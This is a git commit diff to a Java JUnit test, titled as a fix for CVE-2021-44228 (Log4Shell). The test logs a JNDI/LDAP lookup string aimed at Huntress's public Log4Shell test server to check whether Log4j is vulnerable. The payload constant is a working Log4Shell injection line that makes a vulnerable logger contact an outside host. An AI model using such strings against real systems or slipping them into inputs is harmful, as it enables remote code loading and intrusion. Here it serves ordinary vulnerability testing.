efd5a2407cd5f85e42c8f9aa6079fcec9c31958f
Imre Tabur <imre.tabur@eesti.ee>
2021-12-14 11:40:45 +0200

    Fixed CVE-2021-44228

--- java-models/src/test/java/info/setmy/cve/LoggingProblemTest.java
+++ java-models/src/test/java/info/setmy/cve/LoggingProblemTest.java
@@ -8,9 +8,12 @@ public class LoggingProblemTest {
 
     final Logger log = LogManager.getLogger(this.getClass());
 
+    private final String PAYLOAD = "${jndi:ldap://log4shell.huntress.com:1389/e327d2af-38cf-4750-8ee7-43b0c725a62e}";
+
     @Test
     public void logging() {
         // CVE-2021-44228 : https://log4shell.huntress.com/
-        log.info("${jndi:ldap://log4shell.huntress.com:1389/5d43bb34-8f66-4c54-b771-779693a764a9}");
+        log.info("CVE-2021-44228");
+        log.info(PAYLOAD);
     }
 }
